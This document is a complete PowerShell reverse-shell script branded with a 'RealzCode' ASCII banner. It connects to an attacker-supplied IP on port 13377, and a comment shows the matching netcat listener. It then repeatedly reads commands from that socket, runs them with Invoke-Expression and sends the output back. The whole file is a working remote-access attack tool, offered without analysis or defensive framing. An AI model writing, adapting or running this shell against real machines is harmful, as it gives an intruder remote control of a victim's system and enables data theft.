$we = @"
  _____            _      _____          _      
 |  __ \          | |    / ____|        | |     
 | |__) |___  __ _| |___| |     ___   __| | ___ 
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
"@

$po = 13377 # nc -l -p 13377

if ($args.Length -eq 0) {
    Write-Host "Please provide the IP address as a command-line argument."
    exit 1
}

$ip = $args[0]
$clientIp = (Test-Connection -ComputerName $env:COMPUTERNAME -Count 1).IPV4Address.IPAddressToString
$we += "Client IP: $clientIp`n"

try {
    $sock = New-Object System.Net.Sockets.TcpClient($ip, $po)
    $stream = $sock.GetStream()
    $writer = New-Object System.IO.StreamWriter($stream)
    $reader = New-Object System.IO.StreamReader($stream)

    Write-Host "$ip:$po"

    $writer.WriteLine("$we")
    $writer.Flush()

    while ($true) {
        $writer.WriteLine("$ ")
        $writer.Flush()

        $cmd = $reader.ReadLine().Trim()

        if ($cmd -eq 'exit') {
            break
        }

        $output = Invoke-Expression $cmd
        $writer.WriteLine($output)
        $writer.Flush()
    }
}
catch [System.Net.Sockets.SocketException] {
    Write-Host "Error: $($_.Exception.Message)"
}
finally {
    $sock.Close()
}
